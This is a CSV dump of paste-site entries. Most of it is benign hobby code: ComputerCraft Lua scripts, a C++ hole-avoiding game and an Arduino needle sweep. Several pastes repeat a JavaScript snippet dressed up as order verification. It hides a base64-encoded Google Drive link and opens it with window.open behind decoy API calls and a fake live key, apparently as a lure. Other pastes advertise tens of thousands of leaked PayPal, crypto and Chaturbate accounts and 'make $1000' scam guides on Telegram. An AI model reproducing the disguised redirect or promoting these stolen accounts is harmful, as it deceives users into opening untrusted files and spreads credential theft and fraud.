id,title,username,language,date,content
bUiWLWbt,Untitled,zebmekey,JavaScript,Thursday 24th of April 2025 12:35:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58464/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
K9CV9ZgB,盾开关信号发射,jaklsfjlsak,Lua,Thursday 24th of April 2025 12:31:41 AM CDT,"-- Script A: On redstone change, broadcast ACTIVATE/DEACTIVATE

-- 1) Open your wireless modem on the top side
rednet.open(""top"")                            -- Open Rednet on ""top"" :contentReference[oaicite:2]{index=2}

-- 2) Loop, waiting for any redstone input change
while true do
  os.pullEvent(""redstone"")                    -- Wait for redstone event :contentReference[oaicite:3]{index=3}

  -- 3) Read the back-side redstone input
  if redstone.getInput(""front"") then           -- Get back-side input (boolean) :contentReference[oaicite:4]{index=4}
    rednet.broadcast(""StatON"", ""SMiner"")     -- Broadcast activation on protocol ""pulse"" :contentReference[oaicite:5]{index=5}
  else
    rednet.broadcast(""StatOFF"", ""SMiner"")   -- Broadcast deactivation on protocol ""pulse"" :contentReference[oaicite:6]{index=6}
  end
end
"
MNWc8JRr,Untitled,slobo14,C++,Thursday 24th of April 2025 12:30:38 AM CDT,"/**
 * Do a needle sweep
 */
void doNeedleSweep() {
  int maxKM = 300;
  int maxRPM = 8000;
  byte multiplier = maxRPM / maxKM + 4;

  byte step = 2;
  byte delayBetween = 250;
  byte delayDuring = 4;

  int km = 0;
  int rpm = 0;

  // Sweep from 0 to @var(maxKM) km/h
  // also sweep rpm from 0 to @var(maxRPM) rpm
  while (km < maxKM)
  {
    km += step;
    rpm = km * multiplier;

    setKmAndRpmWithDelay(km, rpm, delayDuring);
  }

  // Stay at max km/h for specified delay
  delay(delayBetween);

  // Sweep back to 0 km/h
  // also sweep rpm back to 0 rpm
  while (km > 0) {
    km -= step;
    rpm = km * multiplier;
    // slowing down the RPM needle a bit to match km/h needle
    if (km < 80){
      delay(20);
    }
    setKmAndRpmWithDelay(km - 30, rpm, delayDuring);
  }"
EK6Qhh46,Make $1000 15-MINUTES  (BEGINNER) D8,Imakeprivatescripts,JavaScript,Thursday 24th of April 2025 12:27:07 AM CDT," 
Pdf https://tinyurl.com/privguidee

for more methods and fresh accounts: https://t.me/LucasL3AK
NmvS0h5Rnu
"
hNY7Pmxj,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 12:20:27 AM CDT,67371 Accounts Posted On https://t.me/leakedbyeminem
skvnDggB,Untitled,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 12:20:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9vQpQJLp,Untitled,kammex,JavaScript,Thursday 24th of April 2025 12:18:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01449/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zNCt9xX1,EARN $900 INSTANTLY 2025 WW,Imakeprivatescripts,JavaScript,Thursday 24th of April 2025 12:17:51 AM CDT," 
Pdf https://tinyurl.com/privguidee

for more methods and fresh accounts: https://t.me/LucasL3AK
qgVLiUh5UH
"
Tnwd4QHv,Make $1000 15-MINUTES (BEGINNER) PS,Imakeprivatescripts,JavaScript,Thursday 24th of April 2025 12:08:38 AM CDT," 
Pdf https://tinyurl.com/privguidee

for more methods and fresh accounts: https://t.me/LucasL3AK
d7wLxRkdUJ
"
pCh80mrB,C++ Avoid the Hole,shadowlucario50,C++,Thursday 24th of April 2025 12:08:17 AM CDT,"#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>

int main(){
    //Challenge: Use both break and continue functions in one loop.

    //Jump function? Sure.

    srand(time(NULL));
    int hole;
    int walk = 0;
    int hopsleft = 5;
    char playerInput;
    bool winner = true;
    bool cheat = false;
    std::string predict;

    std::cout << ""**AVOID THE HOLES**"";
    std::cout << ""Holes are in the way! Get through without falling!\n"";
    std::cout << ""**Controls**\nPredict: 'p' | Walk: 'w' | Hop: 'h' \n"";
    std::cout << ""Hops Left: "" << hopsleft << '\n';

    for(int i = 1; i <= 50; i++) {
        //20% chance of a hole. Fail if 0 - 9.
        hole = rand() % 50;
        
        std::cout << ""Hole "" << i << "": "";
        if(hole < 10 && cheat == true) {
            std::cout << ""Hop here! "";
        }
        std::cin >> playerInput;

        if (playerInput == 'P') playerInput='p';
        if (playerInput == 'W') playerInput='w';
        if (playerInput == 'H') playerInput='h';
        if (playerInput == 'C') playerInput='c';

        while(playerInput == 'p') {
            std::cout << ""Prediction: "";
            
            if(i <= 10) {
                if(hole < 10) {
                    std::cout << ""There is a hole here!\n"";
                }
                else {
                    std::cout << ""Should be safe!\n"";
                }
            }
            else if(i > 10 && i < 30){
                if(hole < 5) {
                    std::cout << ""There is a hole here!\n"";
                }
                else if(hole < 20) {
                    std::cout << ""There's a chance of there being a hole here...\n"";
                }
                else {
                    std::cout << ""Should be safe!\n"";
                }
            }
            else {
                if(hole < 25) {
                    std::cout << ""There's a chance of there being a hole here...\n"";
                }
                else if(hole >= 25 && hole < 35) {
                    std::cout << ""There could be a hole here!\n"";
                }
                else {
                    std::cout << ""Should be safe...\n"";
                }
            }
            std::cout << ""Hole "" << i << "": "";
            std::cin >> playerInput;
        }

        if(playerInput == 'h') {
            if(hopsleft > 0) {
                hopsleft--;
                std::cout << ""Hops Left: "" << hopsleft << '\n';
                continue;
            }
            else {
                std::cout << ""You have no hops left! You tired yourself out and can no longer go any further...\n**YOU LOSE!**"";
                winner = false;
                break;
            }
        }

        else if(playerInput == 'w') {
            if(hole < 10) {
                if(cheat==false) {
                    std::cout << ""You fell in a hole!\n**YOU LOSE!**\n"";
                }
                else {
                    std::cout << ""You literally had cheats on. How did you lose?\n**YOU SUCK!**\n"";
                }
                winner = false;
                break;
            }
            else {
                std::cout << ""Safe!\n"";
            }
        }
        else if(playerInput == 'c') {
            if(cheat==false) 
            {
                std::cout << ""Cheats Activated! You will now be told when to hop!\n"";
                cheat=true;
                continue;
            }
            else {
                std::cout << ""Nice try. You're only get to skip one hole.\n**YOU LOSE!**\n"";
                winner = false;
                break;
            }
        }
        else {
            std::cout << ""Wrong key! You fall into a hole immediately!\n**YOU LOSE!**\n"";
            winner = false;
            break;
        }

        switch (i) {
            case 5:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 10:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 15:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 20:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 25:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 30:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 35:
                hopsleft+=2;
                std::cout << ""Two hops added!\n"";
                break;
            case 40:
                hopsleft++;
                std::cout << ""One hop added!\n"";
                break;
            case 45:
                hopsleft++;
                std::cout << ""One hop added!\n"";
                break;
            default:
                break;
        }
    }
    if(winner == false) {
        std::cout << ""Try again sometime!"";
    }
    else if(winner == true && cheat == true) {
        std::cout << ""**CONGRATS! YOU CHEATED THE GAME!**"";
    }
    else {
        std::cout << ""**CONGRATS! YOU WIN!**"";
    }

    return 0;
}"
ZmW9jdpU,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Thursday 24th of April 2025 12:03:28 AM CDT,15695 Accounts Posted On https://t.me/leakedbyeminem
4c5kJp26,Order.js,Xp_Isolation,JavaScript,Thursday 24th of April 2025 12:02:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77230/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EzUZ24NS,Chaturbate with Tokens,rodrigomaise99,JavaScript,Wednesday 23rd of April 2025 11:48:04 PM CDT,41798 Accounts Posted On https://t.me/leakedbyeminem
sSsWGz8m,Market.js,Xp_Isolation,JavaScript,Wednesday 23rd of April 2025 11:47:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23453/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
chWwh6cN,sminer信号接收,jaklsfjlsak,Lua,Wednesday 23rd of April 2025 11:35:43 PM CDT,"-- Script B: Listen for ""pulse"" broadcasts and drive front-side redstone
local speaker = peripheral.find(""warpdriveSpeaker"")
-- 1) Open your wireless modem on the top side
rednet.open(""top"")                            -- Open Rednet on ""top"" :contentReference[oaicite:7]{index=7}

-- 2) Loop, receiving commands and setting the front output
while true do
  local senderID, message = rednet.receive(""SMiner"")  -- Receive on protocol ""pulse"" :contentReference[oaicite:8]{index=8}

  -- 3) Update front-side redstone based on the message
  if message == ""check"" then
speaker.speak(""Checked"")
print(""checked"")
    
  end
end
"
Lv1SHsGc,激光扫描发射器 水平采矿 投屏 v3,jaklsfjlsak,Lua,Wednesday 23rd of April 2025 11:32:27 PM CDT,"-- Laser-Guided Warp System (“ztc”) with H/I/O prompts and O-key to run otc

-- 1) Wrap terminal + any attached monitors
local screens = {}

-- Terminal wrapper
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = function() return term.getSize() end,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- Monitor wrappers
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = function() return m.getSize() end,
      setTextColor       = function(c) m.setTextColor(c) end,
      setBackgroundColor = function(c) m.setBackgroundColor(c) end,
      setCursorPos       = function(x,y) m.setCursorPos(x,y) end,
      write              = function(txt) m.write(txt) end,
      monitor            = m,
    })
  end
end

-- 2) Auto-scale monitors so at least 7 lines will fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end

-- Clear every screen to lightGray
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static texts
local titleText     = ""Horizontal Mining System""
local subtitleText  = ""Emit Scanning Laser to Mine Target""
local offsetText    = ""Mining Laser Offset ( I ): ""
local promptH       = ""Press H for Main Menu""
local promptI       = ""Press C to Configure Miner""
local promptO       = ""Press L to Toggle Miner""

-- track offset state
local isOffsetOn = false

-- Draw title, subtitle, and offset-state line (now on line 5)
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1): white on black
    local xT = math.floor((w - #titleText)/2) + 1
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.black)
    s.setCursorPos(xT,1)
    s.write(titleText)

    -- Subtitle (line 3): black on lightGray
    local xS = math.floor((w - #subtitleText)/2) + 1
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(xS,3)
    s.write(subtitleText)

    -- (line 4 is intentionally left blank)

    -- Mining Laser Offset (line 5)
    local statusText = isOffsetOn and ""ON"" or ""OFF""
    local fullOffset = offsetText .. statusText
    local xO = math.floor((w - #fullOffset)/2) + 1

    -- background bar
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,5)
    s.write(string.rep("" "", w))

    -- label
    s.setCursorPos(xO,5)
    s.write(offsetText)

    -- ON vs OFF coloring
    s.setTextColor(colors.white)
    s.setBackgroundColor(isOffsetOn and colors.lime or colors.red)
    s.write(statusText)
  end)
end

-- Draw prompts on the bottom three rows
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-2: O prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-2)
    s.write(string.rep("" "", w))
    local xO = math.floor((w - #promptO)/2) + 1
    s.setCursorPos(xO,h-2)
    s.write(promptO)
    -- line h-1: H prompt
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1)
    s.write(string.rep("" "", w))
    local xH = math.floor((w - #promptH)/2) + 1
    s.setCursorPos(xH,h-1)
    s.write(promptH)
    -- line h: I prompt
    s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h)
    s.write(string.rep("" "", w))
    local xI = math.floor((w - #promptI)/2) + 1
    s.setCursorPos(xI,h)
    s.write(promptI)
  end)
end

-- 5) Set up all modems for rednet, then broadcast a startup check
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""modem"" then
    rednet.open(side)
  end
end
rednet.broadcast(""check"", ""SMiner"")

-- now set up warpdriveLaserCamera peripherals
local cams = peripheral.getNames()
for i=#cams,1,-1 do
  if peripheral.getType(cams[i]) ~= ""warpdriveLaserCamera"" then
    table.remove(cams,i)
  else
    peripheral.wrap(cams[i]).beamFrequency(1420)
  end
end

-- 6) Initial draw (blank coords)
clearAll()
drawStatic()
drawPrompt()

-- 7) Coords line, accepts nil → blanks before first scan (on line 6)
local function updateCoords(x,y,z)
  local sx = x and tostring(x) or ""    ""
  local sy = y and tostring(y) or ""    ""
  local sz = z and tostring(z) or ""    ""
  local coordLine = string.format(""Target: X:%s   Y:%s   Z:%s"", sx, sy, sz)
  forAll(function(s)
    local w,_ = s.getSize()
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,6)
    s.write(string.rep("" "", w))
    local cx = math.floor((w - #coordLine)/2) + 1
    s.setCursorPos(cx,6)
    s.write(coordLine)
  end)
end

-- draw initial blanks (on line 6)
updateCoords(nil,nil,nil)

-- keep last coords around for redraws
local lastX, lastY, lastZ = nil, nil, nil

-- 8) Main loop: scan + key handling + status listener
while true do
  -- 8a) non-blocking check for SMiner status messages
  local sender, msg, proto = rednet.receive(""SMiner"", 0)
  if msg == ""StatON"" then
    isOffsetOn = true
    clearAll(); drawStatic(); updateCoords(lastX,lastY,lastZ); drawPrompt()
  elseif msg == ""StatOFF"" then
    isOffsetOn = false
    clearAll(); drawStatic(); updateCoords(lastX,lastY,lastZ); drawPrompt()
  end

  -- 8b) main events
  local ev,k,b,c,d = os.pullEventRaw()
  if ev == ""laserScanning"" then
    lastX = tonumber(b)
    lastY = tonumber(c)
    lastZ = tonumber(d)
    updateCoords(lastX,lastY,lastZ)
    rednet.broadcast({ x = lastX, y = lastY, z = lastZ }, ""SMineBroadcast"")

  elseif ev == ""key"" then
    if k == keys.h then
      os.reboot()
    elseif k == keys.c then
      shell.run(""conf"")
      clearAll(); drawStatic(); updateCoords(lastX,lastY,lastZ); drawPrompt()
    elseif k == keys.l then
      rednet.broadcast(""Toggle"",""SMiner"")
    end
  end
end
"
jge81dU4,Crypto Accounts,rodrigomaise99,JavaScript,Wednesday 23rd of April 2025 11:32:19 PM CDT,18051 Accounts Posted On https://t.me/leakedbyeminem
